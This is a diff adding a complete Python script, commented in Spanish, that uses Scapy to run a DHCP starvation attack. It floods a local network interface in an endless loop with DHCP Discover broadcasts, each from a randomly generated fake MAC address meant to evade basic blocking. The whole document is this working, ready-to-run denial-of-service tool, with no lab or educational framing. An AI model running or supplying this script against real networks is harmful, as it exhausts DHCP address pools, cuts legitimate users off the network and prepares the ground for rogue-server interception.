@@ -1,0 +1,39 @@
+#!/usr/bin/env python3
+import sys
+from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC
+
+def dhcp_starvation(interface):
+    print(f"[*] Iniciando ataque DHCP Starvation en la interfaz: {interface}")
+    print("[*] Presiona Ctrl+C para detener el ataque.")
+    
+    pkt_count = 0
+    try:
+        while True:
+            # Generar una dirección MAC aleatoria para evadir bloqueos básicos
+            fake_mac = RandMAC()
+            
+            # Construcción del paquete DHCP Discover capa por capa con Scapy
+            packet = (
+                Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
+                IP(src="0.0.0.0", dst="255.255.255.255") /
+                UDP(sport=68, dport=67) /
+                BOOTP(chaddr=fake_mac) /
+                DHCP(options=[("message-type", "discover"), "end"])
+            )
+            
+            # Enviar el paquete a nivel de Capa 2 por la interfaz seleccionada
+            sendp(packet, iface=interface, verbose=False)
+            pkt_count += 1
+            
+            # Mostrar progreso cada 100 paquetes enviados
+            if pkt_count % 100 == 0:
+                print(f"[+] Paquetes DHCPDISCOVER enviados: {pkt_count}")
+                
+    except KeyboardInterrupt:
+        print(f"\n[-] Ataque detenido por el usuario. Total de paquetes enviados: {pkt_count}")
+
+if __name__ == "__main__":
+    # IMPORTANTE: Cambia "eth0" por el nombre que te dé el comando 'ip a' si es diferente
+    iface = "eth0" 
+    
+    dhcp_starvation(iface)
